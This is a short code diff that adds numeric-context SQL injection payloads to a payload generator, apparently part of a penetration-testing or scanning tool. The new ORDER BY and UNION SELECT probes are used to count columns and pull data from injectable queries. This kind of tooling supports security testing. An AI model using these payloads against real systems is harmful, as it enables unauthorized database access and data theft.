@@ -105,6 +105,9 @@ def order_by_probes(max_cols: int = 20) -> List[str]:
         probes.append(f"')) ORDER BY {n} --")
         probes.append(f" ORDER BY {n}-- -")
         probes.append(f" ORDER BY {n}#")
+        # Numeric context: no closing quote needed (e.g. WHERE id = {value})
+        probes.append(f"0 ORDER BY {n}-- -")
+        probes.append(f"0 ORDER BY {n}#")
         probes.append(f"' GROUP BY {n}-- -")
         probes.append(f"' /**/ORDER/**/BY/**/ {n}-- -")
         probes.append(f"' /*!ORDER BY*/ {n}-- -")
@@ -140,6 +143,10 @@ def union_null_probes(col_count: int, marker: str) -> List[str]:
             payloads.append(f"' UNION SELECT {inner}#")
             payloads.append(f" UNION SELECT {inner}-- -")
             payloads.append(f" UNION SELECT {inner}#")
+            # Numeric context: seed value 0 returns no rows so the UNION row is
+            # the only result — marker detection works even with no matching rows.
+            payloads.append(f"0 UNION SELECT {inner}-- -")
+            payloads.append(f"0 UNION SELECT {inner}#")
             payloads.append(f"') UNION SELECT {inner}-- -")
             payloads.append(f"') UNION SELECT {inner}#")
             payloads.append(f"')) UNION SELECT {inner}-- -")
